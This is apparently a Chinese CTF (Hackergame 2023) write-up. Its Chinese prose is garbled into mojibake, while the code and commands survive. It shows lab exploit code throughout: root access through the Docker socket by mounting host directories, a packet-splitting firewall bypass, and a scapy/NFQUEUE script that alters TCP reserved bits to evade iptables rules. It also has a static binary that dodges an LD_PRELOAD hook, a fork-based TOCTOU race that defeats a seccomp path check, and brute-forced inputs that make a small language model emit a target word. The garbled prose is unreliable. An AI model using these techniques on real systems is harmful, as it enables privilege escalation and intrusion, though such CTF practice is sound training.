YAML 1.2å¡äº†å¾ˆé•¿æ—¶é—´ï¼Œä¸€ç›´é™·å…¥yamlè§„èŒƒ https://yaml.org/spec/1.2.2/ext/changes/ æåˆ°çš„jsonæ˜¯yaml1.2çš„ä¸¥æ ¼å­é›†ï¼›ç›´åˆ°å‘ç°äº† https://lobste.rs/s/equcp2/json_is_not_yaml_subset ï¼Œæåˆ°keyé‡å¤çš„é—®é¢˜ï¼›å›çœ‹ https://yaml.org/spec/1.2.1/#id2759572 ï¼Œæåˆ°jsonå»ºè®®ä½†ä¸å¼ºåˆ¶keyå”¯ä¸€ï¼Œè€Œyaml1.2æ˜¯å¼ºåˆ¶çš„ï¼Œæ‰€ä»¥ {"a":1,"a":1} æ˜¯ä¸€ä¸ªç­”æ¡ˆã€‚  

## Git? Git!

git reflogï¼ŒåŸºç¡€å¸¸è¯†  

## HTTP é›†é‚®å†Œ

æ— çŠ¶æ€ç ï¼šå¾ˆæ—©ä»¥å‰å°±çŸ¥é“http/0.9ï¼Œæ‰€ä»¥è¿™ä¸€é—®æ— å‹åŠ›ã€‚(`GET /`ï¼Œä¸è¦è·Ÿç‰ˆæœ¬å·ï¼Œåˆ™æœåŠ¡å™¨ä¼šæŒ‰ç…§http/0.9å¤„ç†ï¼Œå“åº”ä¸åŒ…å«å¤´ç›´æ¥å°±æ˜¯å†…å®¹)  
è‡³äºå¦‚ä½•çŸ¥é“çš„ï¼Œæ˜¯å› ä¸ºæ‡µæ‡‚æ—¶æœŸæ›¾å°è¯•ç”¨curlè®¿é—®ncçš„ç«¯å£ï¼ˆå””ï¼‰ï¼šï¼ˆ202.38.93.111:10096æ˜¯ä¸Šé¢JSON âŠ‚ YAML?é¢˜ç›®çš„åœ°å€ï¼‰  
```shell
$ curl http://202.38.93.111:10096
curl: (1) Received HTTP/0.9 when not allowed
```

---

12ä¸ªçŠ¶æ€ç ï¼Œå¯¹ç€MDNæ–‡æ¡£ https://developer.mozilla.org/en-US/docs/Web/HTTP/Status é€ä¸ªçœ‹ï¼šï¼ˆå®˜æ–¹äº¤æµç¾¤é‡Œå¯¹æ‰¾ç¬¬13ä¸ªçŠ¶æ€ç å¾ˆç§¯æï¼Œä¸è¿‡ç›¸åŒçš„æ—¶é—´å’Œç²¾åŠ›æˆ‘é€‰æ‹©åšåé¢çš„mathé¢˜ï¼‰  
```
100ï¼š

GET / HTTP/1.1\r\n
Host: example.com\r\n
Expect: 100-continue\r\n
\r\n

 

200ï¼š

GET / HTTP/1.1\r\n
Host: example.com\r\n\r\n


206ï¼š

GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=0-1\r\n
\r\n



304ï¼š

GET / HTTP/1.1\r\n
Host: example.com\r\n
If-None-Match: "64dbafc8-267"\r\n
\r\n


400ï¼š

GET / HTTP/1.1\r\n
Hos: example.com\r\n\r\n


404ï¼š

GET /a HTTP/1.1\r\n
Host: example.com\r\n\r\n


405ï¼š

PUT /a HTTP/1.1\r\n
Host: example.com\r\n\r\n


412:

ï¼ˆè¿™æ˜¯å‰5ä¸ªæ”¶é›†åˆ°çš„çŠ¶æ€ç ä¹‹ä¸€ï¼‰

HEAD /index.html HTTP/1.1\r\n
If-Match: 64dbafc8-267\r\n
Host: example.com\r\n\r\n

HTTP/1.1 412 Precondition Failed
Server: nginx/1.25.2
Date: Sat, 28 Oct 2023 10:35:28 GMT
Content-Type: text/html
Content-Length: 173
Connection: keep-alive


413ï¼š
ï¼ˆå¡11ä¸ªç›¸å½“é•¿æ—¶é—´ï¼Œç›´åˆ°å¾ˆä¹…æ‰æ”¶é›†åˆ°äº†å®ƒï¼‰
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Expect

GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 10000000000\r\n
\r\n


414ï¼š

GET /aa<...è¿™é‡Œçœå»ä¸€äº›ç¯‡å¹…ï¼Œåæ­£å¤Ÿé•¿å°±è¡Œ...>aa HTTP/1.1\r\n
Host: example.com\r\n
\r\n


416ï¼š

GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=1000000-1000\r\n
\r\n


505ï¼š

GET / HTTP/2\r\n
Host: example.com\r\n
\r\n
```

## Docker for Everyone

èƒ½å¤Ÿä¸érootlessçš„docker daemonäº¤äº’ç­‰åŒäºè·å¾—äº†rootæƒé™ã€‚  

å…ˆæŠŠæ ¹ç›®å½•æ˜ å°„è¿›å®¹å™¨çœ‹çœ‹ï¼š  
```shell
docker run --rm -v /:/mnt -it alpine
```
å‘ç°/flagï¼ˆå®¹å™¨å†…æ˜¯/mnt/flagï¼‰æ˜¯æŒ‡å‘/dev/shm/mntçš„ç¬¦å·é“¾æ¥ï¼Œè€Œ/dev/shmåœ¨dockerå†…éƒ¨ä¼šè¢«é‡æ–°æŒ‚è½½è¦†ç›–  

é‚£å°±æŠŠä¸»æœºçš„/dev/shmæ˜ å°„åˆ°dockerå†…éƒ¨ï¼š  
```shell
docker run --rm -v /dev/shm:/mnt -it alpine
```
cat /mnt/flag å¾—åˆ° flag

## æƒœå­—å¦‚é‡‘ 2.0

cod_dictå…±5è¡Œï¼Œæ¯è¡Œç¼ºäº†ä¸€ä¸ªå­—ç¬¦ï¼›å…ˆå°è¯•åœ¨é¦–å°¾è¡¥å…¨ï¼Œè¿è¡Œçœ‹æ•ˆæœï¼Œå†æ‰‹è°ƒå‡ æ¬¡ï¼Œç›´åˆ°è¾“å‡ºçš„flagçœ‹çš„æœ€é¡ºçœ¼ã€‚  

è‡ªå·±åœ¨å¼€èµ›å‰æœŸç¡®å®ä¸€é“mathéƒ½æ²¡æœ‰æ€è·¯ï¼ˆè¿™é¢˜ä¸ç®—ï¼‰ï¼Œä¸€åº¦ä¸§å¤±ä¿¡å¿ƒï¼ŒåæœŸæ‰æ…¢æ…¢â€¦â€¦

## ğŸª é«˜é¢‘ç‡æ˜Ÿçƒ

`asciinema play asciinema_restore.rec > restore_dump.bin` asciinema play é‡æ”¾çš„åŒæ—¶dumpåˆ°æ–‡ä»¶ï¼ˆç°åœ¨çœ‹æ¥å…¶å®ç”¨asciinema catæ›´å¥½ï¼‰  

vimæ‰“å¼€ï¼Œå¯ä»¥çœ‹åˆ°åå¤å‡ºç°çš„ç¿»é¡µæ§åˆ¶å­—ç¬¦ï¼š
```
...
    "iMpdOxr4",
:^[[K^M^[[K ^[[KESC^H^H^HESC^[[K[^H[^[[K6^H6^[[K~^H~^M^[[K    "WONdOSodWPKv",
    "kSkjp8kZEq",
...
    "h19qnmkJ",
:^[[K^M^[[K ^[[KESC^H^H^HESC^[[K[^H[^[[K6^H6^[[K~^H~^M^[[K    "Ax95W6Pl",
    "WRytCMXh",
...
```

æŠŠè¿™äº›æ§åˆ¶å­—ç¬¦æ‰¹é‡æ›¿æ¢ä¸ºç©ºï¼Œé¡ºä¾¿æŠŠ"\r\n"ä¹Ÿè¿˜åŸæˆ"\n"ï¼ˆ"\r\n"æ˜¯ç»ˆç«¯çš„æ¢è¡Œï¼‰  
```python
with open("restore_dump.bin", "rb") as f:
    s = f.read()

'''
000009b0: 0d0a 2020 2020 226b 386b 5277 6d6f 4e57  ..    "k8kRwmoNW
000009c0: 5143 222c 0d0a 3a1b 5b4b 0d1b 5b4b 201b  QC",..:.[K..[K .
000009d0: 5b4b 4553 4308 0808 4553 431b 5b4b 5b08  [KESC...ESC.[K[.
000009e0: 5b1b 5b4b 3608 361b 5b4b 7e08 7e0d 1b5b  [.[K6.6.[K~.~..[
000009f0: 4b20 2020 2022 5735 382f 574f 714e 5736  K    "W58/WOqNW6
00000a00: 6922 2c0d 0a20 2020 2022 7053 6f64 434b  i",..    "pSodCK
'''

s = s.replace(bytes.fromhex("""
               3a1b 5b4b 0d1b 5b4b 201b
5b4b 4553 4308 0808 4553 431b 5b4b 5b08
5b1b 5b4b 3608 361b 5b4b 7e08 7e0d 1b5b
4b
"""), b"")
s = s.replace(b"\r\n", b"\n")

with open("restore_dump_filtered.bin", "wb") as f:
    f.write(s)
```

æœ€åæ‰‹åŠ¨åˆ é™¤æ–‡ä»¶å¤´å°¾çš„å…¶ä»–æ§åˆ¶å­—ç¬¦ï¼Œç”¨nodejsè¿è¡Œå³å¯  

## ğŸª å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ ï¼ˆéƒ¨åˆ†å®Œæˆï¼‰

éš¾åº¦åˆ†æ°´å²­ã€‚åœ¨æ­¤ä¹‹åçš„é¢˜ç›®éš¾åº¦éª¤ç„¶åŠ å¤§ï¼ˆè¿™å°±æ˜¯éš¾åº¦æ¢¯åº¦åŠ å¤§ä¹ˆï¼Ÿä½†æ˜¯æ¢¯åº¦å¤ªå¤§ç›´æ¥æˆæ‚¬å´–äº†ï¼‰  

å¯¹AIå®åœ¨æ²¡å•¥æ„Ÿè§‰ï¼Œç¬¬ä¸€å…³éƒ½å¡äº†å¾ˆä¹…ï¼Œç›´åˆ°æš´æ€’åç²˜è´´äº†æ— æ•°ä¸ª"you are smart "ï¼š
```
you are smart you are smart you are smart you are smart you are smart you are smart you are smart you are smart you are smart you are smart you are smart you are smart 
```
ç»“æœflagå°±å‡ºäº†ï¼Ÿï¼Ÿï¼ˆç”±äºæ˜¯ç²˜è´´ï¼Œæ‰€ä»¥æœ«å°¾çš„ç©ºæ ¼æ— æ„é—´ä¿ç•™äº†ï¼Œæ²¡æƒ³åˆ°ç¼ºå°‘è¿™ä¸ªç©ºæ ¼è¿˜ä¼šå¯¼è‡´å‡ºä¸æ¥ç»“æœï¼‰  

ç¬¬äºŒå…³åªå…è®¸æœ€å¤š7ä¸ªè¾“å…¥å­—ç¬¦ï¼Œæš—ç¤ºäº†çˆ†ç ´æ˜¯ä¸€ç§åˆæ³•çš„è§£æ³•ã€‚æœ¬åœ°èŠ±è´¹3Gç£ç›˜+åŠä¸ªå¤šå°æ—¶è£…å¥½äº†pytorchçš„gpuç¯å¢ƒï¼ˆä¸€ç›´åƒç°çš„nvidiaç‹¬æ˜¾ç»ˆäºæ´¾ä¸Šäº†ç”¨åœºï¼‰ï¼ˆæ³¨æ„ä¸‹è½½çš„TinyStories-33M.zipè¦å…ˆè§£å‹æ‰èƒ½è¢«æœ¬åœ°è¯†åˆ«ï¼‰ï¼š  

ï¼ˆwindowsä¸Šçš„tokenizersåº“è¿˜ä¸æ”¯æŒpython3.12ï¼Œè£…åˆ°ä¸€åŠæ‰é‡åˆ°è¿™ä¸ªå‘ï¼Œåˆæ¢python3.11é‡å»ºäº†è™šæ‹Ÿç¯å¢ƒï¼‰ï¼ˆè‡ªå·±é€šå¸¸ä¸å»ºè™šæ‹Ÿç¯å¢ƒï¼Œå› ä¸ºè·‘expçš„ç¯å¢ƒè‡ªç„¶æ˜¯åº“è¶Šå¤šè¶Šå¥½(åŒºåˆ«äºé¡¹ç›®å¼€å‘çš„ç¯å¢ƒéœ€è¦çº¯å‡€çš„ä¾èµ–)ï¼Œä½†æ˜¯AIç”Ÿæ€çš„å„ç§pythonåº“ä¾µå…¥æ€§è¿‡å¼ºï¼Œè¿˜æ˜¯è¦ä¿æŠ¤ä¸‹å¥½ä¸å®¹æ˜“ç§¯ç´¯çš„è„†å¼±site-packagesï¼‰  

```python
from transformers import AutoModelForCausalLM, AutoTokenizer
import torch
from tqdm import tqdm

model = AutoModelForCausalLM.from_pretrained("./TinyStories-33M").eval()
tokenizer = AutoTokenizer.from_pretrained("./TinyStories-33M")

device = "cuda:0" if torch.cuda.is_available() else "cpu"
assert device == "cuda:0"

def predict(message):
    global device
    global model
    model_inputs = tokenizer.encode(message, return_tensors="pt")
    if 1:
        model_inputs = model_inputs.to(device)
        model = model.to(device)
    model_outputs = model.generate(
        model_inputs,
        max_new_tokens=30,
        num_beams=1,
        pad_token_id=tokenizer.eos_token_id,
    )
    model_outputs = model_outputs[0, len(model_inputs[0]) :]
    model_output_text = tokenizer.decode(model_outputs, skip_special_tokens=True)
    return model_output_text


with open("words_alpha.txt", "r") as f:
    lines = f.readlines()

words = [line.strip() for line in lines if len(line.strip()) <= 7]

total = len(words)
print(len(words))

for i, word in enumerate(tqdm(words)):
    if i % 100 == 0 and 0:
        print(i)
    output = predict(word)
    response = output.strip().lower()
    if "accepted" in output:
        print("success")
        print(word)
        print(response)
        break
```

word_alpha.txtæ¥è‡ªä¸€ä¸ªéšä¾¿æ‰¾çš„è¯å…¸ï¼š https://github.com/dwyl/english-words/blob/master/words_alpha.txt  
è¯å…¸æœ‰æ¥è¿‘10ä¸‡ä¸ªå°äºç­‰äº7ä¸ªå­—æ¯çš„å•è¯ã€‚æœ€åˆè¯•çš„æ˜¯cpuï¼ˆèŠ‚çœç‚¹ç£ç›˜ç©ºé—´ï¼Œcpuç‰ˆæœ¬çš„pytorchå°å¤šäº†ï¼‰ï¼Œé€Ÿç‡å¤§æ¦‚1ç§’è·‘1ä¸ªå•è¯ï¼Œæ¢äº†gpuè¾¾åˆ°1ç§’è·‘6ä¸ªå•è¯ï¼Œé¢„ä¼°æ—¶é—´3.5ä¸ªå°æ—¶ï¼Œå®é™…è·‘äº†40åˆ†é’Ÿå°±æ‰¾åˆ°äº†ç¬¬ä¸€ä¸ªç­”æ¡ˆï¼šchiasmi  ï¼ˆè¿™ä¸ªå•è¯æ€ä¹ˆçœ‹éƒ½ä¸acceptedæ— å…³ï¼Œä½†å®ƒç¡®å®èƒ½è¯±å¯¼æˆåŠŸï¼‰  

åä¸¤å…³è¶…å‡ºè‡ªå·±çš„èƒ½åŠ›èŒƒå›´äº†ã€‚æ˜¾ç„¶é¢˜ç›®æœŸæœ›çš„è¾“å‡ºæ˜¯ä¸ä¼šå‡ºç°åœ¨æ¨¡å‹çš„è®­ç»ƒè¯­æ–™ä¸­çš„ï¼Œæ›¾çŒœæµ‹å¯èƒ½æ˜¯è¦æ„é€ æŸç§å…·å¤‡ä¸Šä¸‹æ–‡å…³è”ç»“æ„çš„promptè®©æ¨¡å‹å­¦ä¼šé‡å¤è¾“å…¥ï¼ˆèµ›åçœ‹é¢˜è§£è¿™ä¸ªçŒœæµ‹å®Œå…¨é”™äº†ï¼‰ã€‚  

## ğŸª æµå¼æ˜Ÿçƒ

é¢˜ç›®ç›´æ¥æŠŠæ¯ä¸ªè§†é¢‘å¸§ç»„æˆè¿ç»­çš„å›¾ç‰‡æµå†è½¬æ¢ä¸ºå­—èŠ‚æµï¼Œè¿™æœŸé—´ä¸¢å¤±äº†å®½åº¦ã€é«˜åº¦ã€å¸§æ•°ä¸‰ä¸ªé‡è¦ä¿¡æ¯ã€‚  

ç¬¬ä¸€ååº”æ˜¯å› å¼åˆ†è§£ä¸€ä¸‹ï¼Œä½†æ˜¯ç»™çš„å­—èŠ‚æµæœ«å°¾éšæœºåˆ‡äº†ä¸€å—ï¼Œæ­¤æ–¹æ³•ä¸å†æˆç«‹ã€‚  

é‚£ä¹ˆä¸å¦‚æš´åŠ›ï¼ŒçŒœæµ‹æ­£å¸¸è§†é¢‘çš„å®½åº¦åœ¨100åˆ°1000ä¹‹é—´ï¼Œç”Ÿæˆ900å¼ å›¾ç‰‡äººå·¥å»çœ‹ï¼Œå¾ˆå®¹æ˜“å‘ç°å®½åº¦ä¸º427çš„å›¾ç‰‡æ˜¯æ­£å¸¸çš„ï¼Œæ‰€ä»¥å®½åº¦å°±æ˜¯427ï¼›å†ä»ç›¸é‚»ä¸¤å¸§çš„å›¾ç‰‡è¯†åˆ«å‡ºé«˜åº¦ä¸º759ã€‚  

æ¥ä¸‹æ¥ç»•äº†å¼¯è·¯æƒ³è¿˜åŸä¸ºè§†é¢‘å†æŠ½å¸§ï¼Œåæ¥ååº”è¿‡æ¥ä¸ºä»€ä¹ˆä¸ç›´æ¥è¾“å‡ºå›¾ç‰‡å‘¢ï¼š  

```python
import cv2
import numpy as np

buffer = np.fromfile("video.bin", dtype=np.uint8)
print(len(buffer))    # 135146688 = 2**6 * 3 * 409 * 1721

'''
buffer = buffer.reshape((45048896, 3))
print(buffer)
for i in range(10):
    print(buffer[i])

for i in range(100, 1000):
    cv2.imwrite(f"tmpimgs/tmpimg{i}.png", buffer[:1000*i].reshape(1000,i,3))
'''

# 759*427
# 135146781 = 139 * 759*427 * 3

# cv2.imwrite(f"tmpimgs/tmpimg{i}.png", buffer[:1000*i].reshape(1000,i,3))

buffer = np.pad(buffer, (0, 135146781-135146688), 'constant')
buffer = buffer.reshape((139, 759, 427, 3))

for i in range(139):
    cv2.imwrite(f"tmpimgs/tmpimg{i}.png", buffer[i])

'''
# https://stackoverflow.com/questions/67253596/converting-numpy-array-to-videoframe
fps = 2
out = cv2.VideoWriter('video.mp4', cv2.VideoWriter_fourcc(*'mp4v'), fps, (427, 759))
for i in range(139):
    data = buffer[i, :, :, :]
    out.write(data)
'''
```

## ğŸª ä½å¸¦å®½æ˜Ÿçƒ ï¼ˆéƒ¨åˆ†å®Œæˆï¼‰

ç¡®å®ä¸­é—´åŠ ä¸€é—®ä½“éªŒä¼šæ›´å¥½ä¸€ç‚¹  

çº¯è‰²å‹ç¼©ï¼Œä½å›¾è‚¯å®šæ¯”ä¸ä¸ŠçŸ¢é‡å›¾ã€‚æ‰‹å†™svgä»¥ä¸åˆ°300ä¸ªå­—èŠ‚é€šè¿‡äº†ç¬¬ä¸€å…³ï¼Œç„¶åç¬¬äºŒå…³è¢«å½»åº•å¡ä½ï¼ˆæœ€å¥½æƒ…å†µç”¨svgzè¾¾åˆ°äº†106å­—èŠ‚ï¼‰  

æ‰¾åˆ°äº†ä¸€ä¸ªæœ‰è¶£çš„æ ¼å¼ iconvg https://github.com/google/iconvg/tree/main ï¼Œçœ‹èµ·æ¥åº”è¯¥èƒ½è¾¾åˆ°50å­—èŠ‚çš„ç›®æ ‡ï¼Œä½†å¾ˆé—æ†¾libvipså¹¶ä¸æ”¯æŒ  
æ‰¾libvipsæ”¯æŒçš„æ ¼å¼ https://github.com/libvips/libvips/blob/df8b8e247ed410138fcacec2f43f0c5c16aecc37/libvips/foreign/foreign.c#L654 ï¼Œjpeg-xlå°±åœ¨å…¶ä¸­ä½†ç¬¬ä¸€æ—¶é—´å°±å¿½ç•¥äº†ï¼ˆæ€è·¯ä¸€ç›´å±€é™åœ¨äºŒè¿›åˆ¶æ ¼å¼çš„çŸ¢é‡å›¾ï¼›çœ‹åˆ°wikiè¯´å®ƒæ˜¯ä½å›¾å°±ç›´æ¥æ”¾äº†ï¼Œè€Œä¸”jpeg-xlçš„å‰ç¼€ä¹Ÿé€ æˆäº†åˆ»æ¿å°è±¡ä»¥ä¸ºè·Ÿjpegæ–‡ä»¶ä¸€æ ·ä¼šå¾ˆå¤§ã€‚ã€‚ã€‚æ²¡æƒ³åˆ°è¿™å°±æ˜¯é¢˜ç›®ç­”æ¡ˆï¼‰  

## Komm, sÃ¼sser Flagge ï¼ˆéƒ¨åˆ†å®Œæˆï¼‰

ç¬¬ä¸€å…³åªè¦è®©POSTæ‹†åˆ†åˆ°ä¸¤ä¸ªTCPåŒ…ä¸­å³å¯ç»•è¿‡æ£€æŸ¥ï¼š

```python
from pwn import *

token = "<>"

payload1 = f"""POST / HTTP/1.1\r\nHost: 202.38.93.111\r\nContent-Length: {len(token)}\r\n\r\n{token}"""

def solve1():
    s = remote("202.38.93.111", 18080)
    s.send(payload1[:3])
    sleep(3)
    s.send(payload1[3:])
    s.interactive()

solve1()
```


ç„¶åï¼Œç¬¬äºŒå…³ç¡¬æ˜¯å¡äº†ç›¸å½“é•¿æ—¶é—´ï¼ˆåšé¢˜å¤ªè§„çŸ©äº†ï¼Œç«Ÿç„¶æ²¡æƒ³åˆ°ç›´æ¥è¯•è¯•ç”¨ç¬¬ä¸€å…³çš„expæ‰“ç¬¬äºŒå…³â€¦â€¦ï¼‰  

æ‰¾åˆ°ä¸€ç¯‡æ–‡æ¡£ http://www.stearns.org/doc/archives/iptables-u32.v0.1.4.html çŒœåˆ°äº†è¦åˆ©ç”¨reservedï¼ˆp.s.è¿™ä¸ªè¯æ€»æ˜¯æ‰“æˆreversedï¼‰bitæäº‹æƒ…ï¼Œä½†è‹¦äºä¸çŸ¥é“å¦‚ä½•æ”¹åŒ…å¤´ã€‚  
ç¬¬ä¸€è½®è¯•éªŒï¼Œæ‰¾å„ç§ç”¨rawsocketå®ç°çš„tcpåè®®æ ˆï¼Œä½†å¤§éƒ¨åˆ†éƒ½è·‘ä¸èµ·æ¥ï¼Œä¸çŸ¥é“åŸå›   
ç¬¬äºŒè½®è¯•éªŒï¼Œå¾—çŸ¥äº†pythonçš„scapyåº“èƒ½æ„é€ å„ç§åŒ…å¹¶å‘é€ï¼Œä½†æ˜¯æ— è®ºæ€ä¹ˆæï¼Œå‘äº†synåŒ…å°±ä¼šå¡åœ¨sr1å‡½æ•°è°ƒç”¨ä¸Šï¼ŒæŠ˜è…¾ä¸æ˜ç™½  

åæ¥ï¼Œå¾—çŸ¥äº†nfqueueï¼Œå¯ä»¥å®æ—¶åŠ«æŒæ•°æ®åŒ…ï¼Œå€Ÿæ­¤åšå‡ºäº†ç¬¬äºŒé¢˜ï¼š  

å‡†å¤‡å·¥ä½œï¼šç½‘ç»œç¯å¢ƒæœ‰ç‚¹å¤æ‚ï¼ˆè‡³å°‘ä¸¤å±‚è·¯ç”±å™¨çš„nat+è™šæ‹Ÿæœºçš„natï¼‰ï¼Œä¿å®ˆèµ·è§ç›´æ¥è¿å…¥ç»™çš„openvpnï¼Œç„¶åiptablesé…ç½®æ•°æ®åŒ…è½¬å‘åˆ°nfqueue  
```shell
sudo openvpn hg-guest.ovpn
sudo iptables -A OUTPUT -o hgovpn-guest -p tcp -j NFQUEUE --queue-num 1
```
ç”¨scapyæ‹¦æˆªæ‰€æœ‰queueä¸­çš„æ•°æ®åŒ…ï¼Œè®¾ç½®tcpåŒ…å¤´çš„reservedå­—æ®µä¸º1ç»•å¼€æ£€æŸ¥ï¼ˆä»£ç åŸºäºchatgptç”Ÿæˆå†äººå·¥ä¿®æ”¹ï¼‰ï¼š  
```python
from scapy.all import *
from netfilterqueue import NetfilterQueue as nfq

def packet_callback(packet):
    pkt = IP(packet.get_payload())
    print(pkt.show())

    pkt[IP].ttl = 64

    pkt[TCP].reserved = 15
    del pkt[IP].chksum
    del pkt[TCP].chksum

    print(pkt.show())

    packet.set_payload(bytes(pkt))
    packet.accept()

def main():
    q = nfq()
    q.bind(1, packet_callback)

    try:
        q.run()
    finally:
        q.unbind()

if __name__ == "__main__":
    main()
```
ä¿æŒè„šæœ¬è¿è¡Œï¼Œæ­£å¸¸è®¿é—®ç¬¬äºŒå…³çš„åœ°å€å¾—åˆ°ç¬¬äºŒå…³flagï¼š
```shell
curl -X POST -d "<token>" http://192.168.23.1:18081
```

ç¬¬ä¸‰å…³ï¼Œå¤§æ¦‚çœ‹å‡ºæ¥æ˜¯è¦å¯¹æ¯ä¸ªæ•°æ®åŒ…éƒ½åŠ å…¥"GET / HTTP"å­—ç¬¦ä¸²ï¼Œè€Œä¸”synä¹‹ç±»çš„æ¡æ‰‹åŒ…ä¹Ÿä¸èƒ½ä¾‹å¤–ã€‚è¿™é‡Œé”™è¯¯çš„ç†è§£äº†--from 0 --to 50ä»¥ä¸ºæ˜¯tcp payloadçš„éƒ¨åˆ†ï¼ˆç»“æœæ˜¯ä»IPåŒ…å¤´å¼€å§‹çš„ï¼‰ï¼Œåœ¨å„ç§å°è¯•ç”¨scapyæ„é€ æ•°æ®åŒ…ã€ä¿®seqï¼›ç„¶è€Œå§‹ç»ˆéƒ½æ²¡æœ‰ç”¨scapyæ­£å¸¸å‘å‡ºè¿‡ä¸€ä¸ªæ­£å¸¸çš„httpè¯·æ±‚å¹¶æ”¶åˆ°å“åº”ï¼Œæœ€ç»ˆæ”¾å¼ƒã€‚  

## ä¸ºä»€ä¹ˆè¦æ‰“å¼€ /flag ğŸ˜¡

æ›¾è®°å¾—å‰å‡ å±Šhackergameçš„ç¾¤é‡Œå‡ºç°è¿‡ä¸€å¥åè¨€ï¼šæ’è¡Œæ¦œæ˜¯åŠ¨æ€çš„ï¼Œä¸€è¡€æ¦œæ˜¯æ°¸ä¹…çš„ã€‚  
æ‰€ä»¥ï¼Œæƒ³æ¦œä¸Šç•™åï¼Œæœ€å¥½çš„æ–¹æ³•æ˜¯å¼€èµ›å¤§éƒ¨åˆ†äººéƒ½åœ¨æŠ¢ç­¾åˆ°é¢˜æ—¶é€‰ä¸€ä¸ªå†·é—¨åˆ†ç±»å•ƒä¸‹æ¥ä¸€é“ä¸€è¡€ã€‚  
ï¼ˆäº‹å®è¯æ˜è¿™ä¸ªç­–ç•¥å¾ˆæœ‰æ•ˆï¼Œä»Šå¹´çš„æ€»æ’è¡Œæ¦œå·åˆ°çˆ†ç‚¸ã€‚ã€‚ã€‚ï¼‰  

ç¬¬ä¸€å…³LD_PRELOADï¼ŒåŠ¨æ€é“¾æ¥å™¨ld.soä¼šç”¨è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œæ‰€ä»¥åªè¦é™æ€é“¾æ¥å³å¯ç»•è¿‡ï¼š  
```c
#include <unistd.h>
#include <fcntl.h>

int main(void) {
        char buf[4096];
        int fd = open("/flag", 0);
        int r = read(fd, buf, 4096);
        write(1, buf, r);
        close(fd);
        return 0;
}
```
```shell
gcc -static level1.c -o level1
```

ç¬¬äºŒå…³seccompé™åˆ¶äº†ç³»ç»Ÿè°ƒç”¨ï¼Œä½†opening_handleré‡Œçš„continue_syscallä¸€çœ¼çœ‹ä¸Šå»å°±æœ‰TOCTOUçš„å±é™©ï¼›æŸ¥äº†ä¸‹seccomp_unotifyçš„man pageä»¥åŠrustçš„è¿™ä¸ªåº“ï¼Œéƒ½ç»™å‡ºäº†åŒæ ·çš„è­¦å‘Šã€‚æ‰€ä»¥è§£æ³•å·²ç»å‡ºæ¥äº†ï¼Œç”¨å¤šçº¿ç¨‹/å¤šè¿›ç¨‹ä¸æ–­æ”¹å˜å‚æ•°çš„å†…å­˜ï¼ŒæœŸæœ›åœ¨æ£€æŸ¥æ—¶é€šè¿‡ç„¶ååœ¨å®é™…æ‰§è¡Œæ—¶æ¢å›flagçš„è·¯å¾„ã€‚  

ä½†æ˜¯ï¼Œæ€»æ„Ÿè§‰è§£æ³•å‡ºæ¥çš„å¤ªå®¹æ˜“äº†æ€€ç–‘æœ‰æš—å‘ï¼Œä¸ºäº†æ±‚ä¸€æ‰‹ç¨³ï¼Œæƒ³ç€å…ˆåœ¨æœ¬åœ°æµ‹è¯•ä¸€ä¸‹ï¼Œäºæ˜¯åå°docker pullç€ï¼ˆå› ä¸ºapt-getç›´æ¥è£…çš„ruståœ¨ç¼–è¯‘æ—¶å‡ºé”™ï¼Œè‡ªå·±åˆä¸æ‡‚rustä¸ä¼šä¿®ï¼›å¦ï¼šrustçš„å®‰å…¨è®¾è®¡ç†å¿µç¡®å®å¾ˆå¥½(C/C++ä»£ç è¦æƒ³å†™çš„å®Œå¤‡å¾€å¾€ä¹Ÿä¼šæœ‰æ„æ— æ„çš„éµå¾ªrustç¼–è¯‘å™¨å¼ºåˆ¶æ‰§è¡Œçš„çº¦æŸ)ï¼Œä½†ä¸ªäººä¸å¤ªå–œæ¬¢å®ƒçš„è¯­æ³•ï¼›è€Œä¸”ï¼Œåšé€†å‘æ—¶çœŸçš„ä¸æƒ³é‡åˆ°rustç¼–è¯‘å‡ºçš„äºŒè¿›åˆ¶ç¨‹åºï¼‰ï¼Œè½¬å¤´å»åš*é€†å‘å·¥ç¨‹ä¸éœ€è¦F5*ã€‚ç»“æœç½‘é€Ÿçˆ†ç‚¸ç¡¬æ˜¯ä¸¤ä¸ªå°æ—¶æ²¡æ‹‰ä¸‹æ¥é•œåƒï¼Œç›´åˆ°å‚æ™šå‘ç°ç¬¬äºŒå…³ä¸€è¡€å‡ºäº†â€¦â€¦æœæ–­è®¤å®šæ€è·¯æˆç«‹ï¼Œä¸å†çº ç»“æœ¬åœ°æµ‹è¯•ï¼Œç›´æ¥ç¡¬å†™ï¼š  
```c
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>

void store(char *s, int offset, int value) {
        s[offset] = value;
}

int main(void) {
        // alarm(1);
        char buf[4096];
        volatile char *name = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
        name[0] = '/';
        name[1] = 'f';
        name[2] = '1';
        name[3] = 'a';
        name[4] = 'g';
        name[5] = '\0';
        pid_t pid = fork();
        if (pid == 0) {
                for (int i = 0; i < 0x1000000; i++) {
                        ;
                }
                int fd = open(name, 0);
                int r = read(fd, buf, 4096);
                write(1, buf, r);
                close(fd);
        }
        else if (pid > 0) {
                for (int i = 0; i < 0x10000000; i++) {
                        store(name, 2, 'l');
                        store(name, 2, '1');
                }
        }
        return 0;
}
```
æœ€å¼€å§‹å†™äº†ä¸€ä¸ªpthread_createçš„å¤šçº¿ç¨‹ç‰ˆæœ¬ï¼Œä½†ä¼ ä¸Šå»ä¸æˆåŠŸï¼›ä¸æƒ³çº ç»“ï¼Œæ”¹ç”¨mmapå…±äº«å†…å­˜+forkå¤šè¿›ç¨‹ï¼Œå³ä¸Šé¢çš„ç‰ˆæœ¬ï¼ˆè™½ç„¶æœ€åçœ‹æ¥é—®é¢˜ä¸åœ¨æ­¤ï¼‰ã€‚  
